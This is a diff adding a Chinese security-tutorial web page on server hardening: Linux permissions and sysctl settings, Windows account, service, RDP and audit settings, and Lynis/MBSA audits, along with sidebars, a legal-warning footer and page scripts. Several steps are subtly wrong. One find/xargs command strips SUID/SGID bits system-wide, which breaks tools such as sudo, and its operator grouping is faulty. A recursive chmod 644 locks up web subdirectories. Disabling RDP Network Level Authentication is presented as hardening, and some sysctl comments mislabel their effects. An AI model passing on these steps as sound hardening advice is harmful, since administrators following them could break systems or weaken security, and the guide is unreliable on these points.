+                <h4>4. 文件权限加固（防止未授权访问和篡改）</h4>
+                <pre>
+# 1. 核心系统目录权限配置（仅root可修改）
+chmod -R 755 /etc  # /etc目录（系统配置）：所有者rwx，其他rx
+chown -R root:root /etc  # 确保属主为root
+chmod 600 /etc/shadow  # 密码文件：仅root可读可写
+chmod 644 /etc/passwd  # 用户信息文件：所有人可读，root可写
+
+# 2. 系统命令目录权限配置
+chmod -R 755 /bin /sbin /usr/bin /usr/sbin  # 系统命令：所有者rwx，其他rx
+chown -R root:root /bin /sbin /usr/bin /usr/sbin
+
+# 3. Web目录权限配置（以Nginx为例）
+chown -R www-data:www-data /var/www/html  # Debian/Ubuntu，属主为Web服务用户
+chown -R apache:apache /var/www/html      # CentOS/RHEL
+chmod -R 755 /var/www/html                # 目录权限：rwxr-xr-x（仅所有者可写）
+chmod -R 644 /var/www/html/*              # 文件权限：rw-r--r--（禁止执行）
+
+# 4. 禁止敏感文件SUID/SGID权限（防止提权）
+find / -perm -4000 -o -perm -2000 -print0 | xargs -0 chmod -s 2>/dev/null
+# 注释：SUID/SGID权限允许用户以文件属主身份执行，可能被用于权限提升，非必要禁止
+                </pre>
+                <h4>5. 内核参数加固（sysctl配置，防御网络攻击）</h4>
+                <pre>
+# 1. 编辑sysctl配置文件
+vim /etc/sysctl.conf
+# 2. 添加以下加固参数（复制粘贴，覆盖原有相关参数）
+# 禁止IP转发（非路由器无需转发）
+net.ipv4.ip_forward = 0
+# 禁止源路由（防止IP欺骗）
+net.ipv4.conf.all.accept_source_route = 0
+net.ipv6.conf.all.accept_source_route = 0
+# 禁止ICMP重定向（防止路由欺骗）
+net.ipv4.conf.all.accept_redirects = 0
+net.ipv6.conf.all.accept_redirects = 0
+# 启用源地址验证（防止IP伪造）
+net.ipv4.conf.all.rp_filter = 1
+# 启用SYN Cookie（防御SYN洪水攻击）
+net.ipv4.tcp_syncookies = 1
+# 限制SYN队列大小（默认1024，调整为2048）
+net.ipv4.tcp_max_syn_backlog = 2048
+# 防护ICMP广播风暴
+net.ipv4.icmp_echo_ignore_broadcasts = 1
+net.ipv4.icmp_ignore_bogus_error_responses = 1
+# 禁止发送ICMP重定向
+net.ipv4.conf.all.send_redirects = 0
+# 限制端口扫描（防止TCP TIME_WAIT攻击）
+net.ipv4.tcp_rfc1337 = 1
+# 优化TCP连接回收
+net.ipv4.tcp_tw_recycle = 0
+net.ipv4.tcp_tw_reuse = 1
+net.ipv4.tcp_fin_timeout = 10
+# 禁用IPv6（若不使用IPv6，减少攻击面）
+net.ipv6.conf.all.disable_ipv6 = 1
+net.ipv6.conf.default.disable_ipv6 = 1
+
+# 3. 使内核参数生效
+sysctl -p
+# CentOS/RHEL额外执行（永久生效）
+sysctl --system
+
+# 4. 验证参数是否生效（示例）
+sysctl net.ipv4.tcp_syncookies  # 输出net.ipv4.tcp_syncookies = 1表示生效
+                </pre>
+                <h3>二、Windows服务器基础安全加固（核心配置）</h3>
+                <h4>1. 账号安全加固</h4>
+                <ol>
+                    <li>禁用默认管理员账号（Administrator）：计算机管理→本地用户和组→用户→右键Administrator→属性→勾选"账户已禁用"；</li>
+                    <li>创建新的管理员账号：右键"用户"→新用户→设置复杂密码（大小写字母+数字+特殊字符），加入"Administrators"组；</li>
+                    <li>启用密码策略：本地安全策略→账户策略→密码策略→启用"密码必须符合复杂性要求"、"密码长度最小值"（设为8位）、"密码最长使用期限"（设为90天）；</li>
+                    <li>启用账户锁定策略：本地安全策略→账户策略→账户锁定策略→设置"账户锁定阈值"（5次）、"账户锁定时间"（30分钟）。</li>
+                </ol>
+                <h4>2. 关闭无用服务和端口</h4>
+                <ol>
+                    <li>打开服务管理器：运行<code>services.msc</code>；</li>
+                    <li>禁用无用服务：如"Telnet"、"Remote Registry"（远程注册表，高危）、"Print Spooler"（打印机服务）、"Server"（文件共享服务，无需则禁用），右键服务→属性→启动类型设为"禁用"，点击"停止"；</li>
+                    <li>配置Windows防火墙：控制面板→Windows Defender防火墙→高级设置→入站规则→禁用所有不必要的端口，仅开放业务所需端口（如80、443、3389（远程桌面，如需））。</li>
+                </ol>
+                <h4>3. 远程桌面（RDP）安全加固</h4>
+                <ol>
+                    <li>修改远程桌面默认端口（3389）：注册表编辑器→HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp→修改"PortNumber"为自定义端口（如33890，十进制）；HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp→同样修改"PortNumber"；</li>
+                    <li>禁用网络级别身份验证（NLA）：远程桌面设置→高级→设置→取消勾选"允许网络级别身份验证"（如需，根据安全需求选择）；</li>
+                    <li>限制远程登录用户：本地安全策略→本地策略→用户权限分配→"允许通过远程桌面服务登录"→仅保留必要的管理员账号。</li>
+                </ol>
+                <h4>4. 开启审计日志</h4>
+                <ol>
+                    <li>本地安全策略→本地策略→审核策略→启用"审核登录事件"（成功+失败）、"审核账户管理"（成功+失败）、"审核对象访问"（失败）、"审核特权使用"（失败）；</li>
+                    <li>事件查看器→Windows日志→安全→定期查看登录失败、账户变更等事件，及时发现异常。</li>
+                </ol>
+                <h3>三、服务器安全审计（定期检查，持续加固）</h3>
+                <h4>1. Linux安全审计工具（Lynis，开源）</h4>
+                <pre>
+# 1. 安装Lynis（Kali自带，其他Linux需手动安装）
+wget https://downloads.cisofy.com/lynis/lynis-3.0.9.tar.gz
+tar -zxvf lynis-3.0.9.tar.gz
+cd lynis
+
+# 2. 执行安全审计（非特权模式，无需root）
+./lynis audit system
+
+# 3. 查看审计报告
+cat /var/log/lynis.log
+cat /var/log/lynis-report.dat
+
+# 4. 修复报告中的高危问题
+# 报告中以"[WARNING]"标注的为高危问题，"[NOTE]"为建议优化项，按提示修复（如权限错误、未更新补丁、无用服务未关闭）
+                </pre>
+                <h4>2. Windows安全审计工具（Microsoft Baseline Security Analyzer，MBSA）</h4>
+                <ol>
+                    <li>下载MBSA：从微软官网下载MBSA工具（支持Windows 10/Server 2016+）；</li>
+                    <li>运行审计：打开MBSA→点击"扫描一台计算机"→输入本地计算机名或IP→勾选"安全更新"、"密码策略"、"安全配置"等扫描项→点击"开始扫描"；</li>
+                    <li>查看报告：扫描完成后，查看"高风险"项，按提示修复（如未安装的高危补丁、弱密码、不安全的服务配置）。</li>
+                </ol>
+                <h3>四、服务器安全核心原则</h3>
+                <ul>
+                    <li>最小权限原则：所有账号、服务、端口仅授予必要的权限，关闭无用功能；</li>
+                    <li>纵深防御原则：结合防火墙、补丁更新、密码策略、日志审计、数据加密等多层防护；</li>
+                    <li>定期备份原则：核心数据定期备份（本地+异地），防止数据丢失或勒索病毒攻击；</li>
+                    <li>持续监控原则：实时监控服务器日志、进程、网络流量，及时发现异常行为；</li>
+                    <li>合规审计原则：定期进行安全审计，确保服务器配置符合安全标准和法规要求。</li>
+                </ul>
+
+            </div>
+
+            <!-- 分页 -->
+            <div class="pagination">
+                <a href="#legal" class="active">1</a>
+                <a href="#ddos">2</a>
+                <a href="#sql">3</a>
+                <a href="#xss">4</a>
+                <a href="#brute">5</a>
+                <a href="#scan">6</a>
+                <a href="#submit">7</a>
+                <a href="#firewall">8</a>
+                <a href="#audit">9</a>
+                <a href="#encrypt">10</a>
+                <a href="#patch">11</a>
+                <a href="#server">12</a>
+                <a href="#web">下一页</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 右侧栏 -->
+    <div class="right-column">
+        <div class="sidebar-box">
+            <h3><i class="fa fa-bars"></i> 教程分类</h3>
+            <ul class="cate-list">
+                <li><a href="#legal"><i class="fa fa-gavel"></i> 法律声明</a></li>
+                <li><a href="#ddos"><i class="fa fa-warning"></i> DDoS攻击原理与防护</a></li>
+                <li><a href="#sql"><i class="fa fa-database"></i> SQL注入原理与防护</a></li>
+                <li><a href="#xss"><i class="fa fa-code"></i> XSS攻击原理与防护</a></li>
+                <li><a href="#brute"><i class="fa fa-unlock-alt"></i> 暴力破解防护</a></li>
+                <li><a href="#scan"><i class="fa fa-search-plus"></i> 合法漏洞扫描</a></li>
+                <li><a href="#submit"><i class="fa fa-paper-plane"></i> 漏洞提交规范</a></li>
+                <li><a href="#firewall"><i class="fa fa-shield"></i> 防火墙配置教程</a></li>
+                <li><a href="#audit"><i class="fa fa-file-text"></i> 日志审计教程</a></li>
+                <li><a href="#encrypt"><i class="fa fa-lock"></i> 数据加密教程</a></li>
+                <li><a href="#patch"><i class="fa fa-wrench"></i> 系统补丁管理</a></li>
+                <li><a href="#server"><i class="fa fa-server"></i> 服务器安全配置</a></li>
+                <li><a href="#web"><i class="fa fa-globe"></i> Web安全防护</a></li>
+                <li><a href="#network"><i class="fa fa-sitemap"></i> 网络安全防护</a></li>
+                <li><a href="#mobile"><i class="fa fa-mobile"></i> 移动端安全防护</a></li>
+                <li><a href="#cloud"><i class="fa fa-cloud"></i> 云安全防护</a></li>
+                <li><a href="#tools"><i class="fa fa-wrench"></i> 安全工具使用</a></li>
+                <li><a href="#case"><i class="fa fa-book"></i> 案例分析</a></li>
+                <li><a href="#faq"><i class="fa fa-question-circle"></i> 常见问题解答</a></li>
+            </ul>
+        </div>
+
+        <div class="sidebar-box">
+            <h3><i class="fa fa-exclamation-circle"></i> 安全警示</h3>
+            <div class="tip-danger">
+                <p>1. 所有测试必须在自己的合法环境中进行；</p>
+                <p>2. 禁止未经授权访问他人系统；</p>
+                <p>3. 禁止利用漏洞牟利或破坏；</p>
+                <p>4. 发现漏洞请通过合法渠道提交；</p>
+                <p>5. 违法使用本教程内容将承担法律责任。</p>
+            </div>
+        </div>
+
+        <div class="sidebar-box">
+            <h3><i class="fa fa-bookmark"></i> 常用资源</h3>
+            <ul class="cate-list">
+                <li><a href="https://www.owasp.org" target="_blank"><i class="fa fa-external-link"></i> OWASP（Web安全项目）</a></li>
+                <li><a href="https://www.cnvd.org.cn" target="_blank"><i class="fa fa-external-link"></i> CNVD（国家漏洞库）</a></li>
+                <li><a href="https://www.cvedetails.com" target="_blank"><i class="fa fa-external-link"></i> CVE漏洞详情</a></li>
+                <li><a href="https://www.kali.org" target="_blank"><i class="fa fa-external-link"></i> Kali Linux官网</a></li>
+                <li><a href="https://security.stackexchange.com" target="_blank"><i class="fa fa-external-link"></i> 安全问答社区</a></li>
+                <li><a href="https://asrc.alibaba.com" target="_blank"><i class="fa fa-external-link"></i> 阿里云SRC</a></li>
+                <li><a href="https://security.tencent.com/tsrc" target="_blank"><i class="fa fa-external-link"></i> 腾讯云SRC</a></li>
+            </ul>
+        </div>
+
+        <div class="sidebar-box">
+            <h3><i class="fa fa-hot"></i> 热门教程</h3>
+            <ul class="hot-tutorial cate-list">
+                <li><a href="#ddos">经典Termux DDoS工具实操（pembriahmad/DDOS）</a></li>
+                <li><a href="#sql">Kali SQLMap检测SQL注入漏洞（仅合法环境）</a></li>
+                <li><a href="#brute">Kali Hydra暴力破解SSH（实操版）</a></li>
+                <li><a href="#firewall">Linux iptables/firewalld防火墙配置（完整）</a></li>
+                <li><a href="#encrypt">AES/RSA/哈希加密（代码级实操）</a></li>
+                <li><a href="#server">Linux服务器SSH密钥登录配置（最安全）</a></li>
+                <li><a href="#submit">国内合法漏洞提交渠道（全收录）</a></li>
+            </ul>
+        </div>
+
+        <div class="sidebar-box">
+            <h3><i class="fa fa-tags"></i> 关键词标签</h3>
+            <div class="link-list">
+                <a href="#kali">Kali Linux</a>
+                <a href="#termux">Termux</a>
+                <a href="#ddos">DDoS防护</a>
+                <a href="#sql">SQL注入</a>
+                <a href="#xss">XSS防护</a>
+                <a href="#brute">暴力破解</a>
+                <a href="#encrypt">数据加密</a>
+                <a href="#firewall">防火墙</a>
+                <a href="#server">服务器安全</a>
+                <a href="#web">Web安全</a>
+                <a href="#scan">漏洞扫描</a>
+                <a href="#submit">漏洞提交</a>
+                <a href="#patch">补丁管理</a>
+                <a href="#audit">日志审计</a>
+                <a href="#cloud">云安全</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 悬浮功能按钮 -->
+<div class="fixed-btn">
+    <a class="go-top" href="javascript:void(0)" title="返回顶部"> <i class="fa fa-angle-up"></i></a>
+</div>
+<button id="dark-mode-toggle" title="切换暗黑模式">
+    <i class="fa fa-moon-o"></i>
+</button>
+
+<!-- 底部 -->
+<div id="footer" class="mar-t50">
+   <div class="container runoob-block">
+    <dl>
+      <dt>教程分类</dt>
+      <dd>&middot;<a href="#attack">攻击技术（仅学习）</a></dd>
+      <dd>&middot;<a href="#defense">防护方案</a></dd>
+      <dd>&middot;<a href="#vulnerability">漏洞挖掘</a></dd>
+      <dd>&middot;<a href="#legal">法律规范</a></dd>
+      <dd>&middot;<a href="#tools">工具使用</a></dd>
+      <dd>&middot;<a href="#case">案例分析</a></dd>
+    </dl>
+    <dl>
+      <dt>合法资源</dt>
+      <dd>&middot;<a href="https://www.cnvd.org.cn" target="_blank">CNVD漏洞库</a></dd>
+      <dd>&middot;<a href="https://www.owasp.org" target="_blank">OWASP</a></dd>
+      <dd>&middot;<a href="https://www.kali.org" target="_blank">Kali Linux</a></dd>
+      <dd>&middot;<a href="https://security.aliyun.com" target="_blank">阿里云SRC</a></dd>
+      <dd>&middot;<a href="https://security.tencent.com" target="_blank">腾讯云SRC</a></dd>
+    </dl>
+    <dl>
+      <dt>安全提示</dt>
+      <dd>&middot; 仅合法环境测试</dd>
+      <dd>&middot; 禁止非法攻击</dd>
+      <dd>&middot; 及时修复漏洞</dd>
+      <dd>&middot; 定期安全审计</dd>
+      <dd>&middot; 遵守网络安全法</dd>
+    </dl>
+    <dl>
+      <dt>法律相关</dt>
+      <dd>&middot;<a href="https://www.gov.cn/zhengce/falvfagui/2017-06/09/content_5201101.htm" target="_blank">网络安全法</a></dd>
+      <dd>&middot;<a href="https://www.gov.cn/fuwu/bmfw/xingfa.htm" target="_blank">刑法（网络犯罪）</a></dd>
+      <dd>&middot;<a href="https://www.miit.gov.cn" target="_blank">工信部官网</a></dd>
+      <dd>&middot;<a href="https://www.cyberpolice.cn" target="_blank">网络违法犯罪举报</a></dd>
+    </dl>
+   </div>
+   <div class="container copyright">
+     Copyright &copy; 2024 枫叶网络安全学习社区 | 所有教程仅用于合法学习 | 严禁用于非法用途
+     <br>学习交流QQ群：1078205267 | 备案号：闽ICP备XXXXXXX号-1（示例）
+     <br>免责声明：本社区仅提供技术学习教程，用户违法使用导致的法律责任由用户自行承担，本社区不承担任何连带责任。
+   </div>
+</div>
+
+<!-- JavaScript脚本 -->
+<script>
+// 返回顶部功能
+$(".go-top").click(function() {
+    $("html, body").animate({scrollTop: 0}, 500);
+});
+
+// 移动端导航切换
+$(".mobile-nav-toggle").click(function() {
+    $(".mobile-nav").slideToggle();
+});
+
+// 导航栏高亮（滚动时）
+$(window).scroll(function() {
+    var scrollTop = $(window).scrollTop();
+    $("a[href^='#']").each(function() {
+        var target = $(this).attr("href");
+        if ($(target).length) {
+            var offsetTop = $(target).offset().top - 100;
+            var offsetBottom = offsetTop + $(target).height();
+            if (scrollTop >= offsetTop && scrollTop < offsetBottom) {
+                $(this).parent().addClass("active");
+                $(this).css("color", "#e74c3c");
+            } else {
+                $(this).parent().removeClass("active");
+                $(this).css("color", $(this).parent().parent().parent().hasClass("pc-nav") ? "#fff" : "#333");
+            }
+        }
+    });
+});
+
+// 代码块高亮（简化版）
+$(document).ready(function() {
+    $("pre code").each(function() {
+        var code = $(this).text();
+        $(this).html(
+            code.replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;")
+                .replace(/\/\/(.*)/g, "<span class='com'>//$1</span>")
+                .replace(/\b(var|let|const|function|if|else|for|while|return|import|export)\b/g, "<span class='kwd'>$1</span>")
+                .replace(/\b(true|false|null|undefined)\b/g, "<span class='lit'>$1</span>")
+                .replace(/(['"])(.*?)\1/g, "<span class='str'>$1$2$1</span>")
+        );
+    });
+});
+
+// 教程收藏功能（本地存储）
+$(".collect-btn").click(function() {
+    var tutorialId = $(this).attr("data-id");
+    var tutorialTitle = $(this).attr("data-title");
+    // 从本地存储获取已收藏教程
+    var collected = localStorage.getItem("collected_tutorials") ? JSON.parse(localStorage.getItem("collected_tutorials")) : [];
+    // 判断是否已收藏
+    if (collected.includes(tutorialId)) {
+        alert("该教程已收藏！");
+        return;
+    }
+    // 添加到收藏列表
+    collected.push(tutorialId);
+    localStorage.setItem("collected_tutorials", JSON.stringify(collected));
+    // 更新按钮状态
+    $(this).html("<i class='fa fa-star'></i> 已收藏");
+    alert("收藏成功：" + tutorialTitle);
+});
+
+// 教程搜索功能（实时过滤左侧教程目录）
+$("#s").keyup(function() {
+    var keyword = $(this).val().toLowerCase().trim();
+    if (keyword === "") {
+        $(".gallery-list a").show();
+        return;
+    }
+    // 过滤教程目录，包含关键词的显示，否则隐藏
+    $(".gallery-list a").each(function() {
+        var title = $(this).attr("title").toLowerCase();
+        if (title.includes(keyword)) {
+            $(this).show();
+        } else {
+            $(this).hide();
+        }
+    });
+});
+
+// 暗黑模式切换
+$("#dark-mode-toggle").click(function() {
+    $("body").toggleClass("dark-mode");
+    // 保存暗黑模式状态到本地存储
+    if ($("body").hasClass("dark-mode")) {
+        localStorage.setItem("dark_mode", "on");
+        $(this).html("<i class='fa fa-sun-o'></i>");
+    } else {
+        localStorage.setItem("dark_mode", "off");
+        $(this).html("<i class='fa fa-moon-o'></i>");
+    }
+});
+
+// 页面加载时恢复暗黑模式设置
+$(document).ready(function() {
+    // 恢复暗黑模式
+    if (localStorage.getItem("dark_mode") === "on") {
+        $("#dark-mode-toggle").trigger("click");
+    }
+    // 恢复收藏状态
+    if (localStorage.getItem("collected_tutorials")) {
+        var collected = JSON.parse(localStorage.getItem("collected_tutorials"));
+        $(".collect-btn").each(function() {
+            var tutorialId = $(this).attr("data-id");
+            if (collected.includes(tutorialId)) {
+                $(this).html("<i class='fa fa-star'></i> 已收藏");
+            }
+        });
+    }
+});
+
+// 平滑滚动（点击锚点链接时）
+$("a[href^='#']").click(function(e) {
+    e.preventDefault();
+    var target = $(this).attr("href");
+    if (target === "#") return;
+    var offsetTop = $(target).offset().top - 80; // 偏移80px，避免被导航栏遮挡
+    $("html, body").animate({scrollTop: offsetTop}, 300);
+});
+</script>
 </body>
 </html>
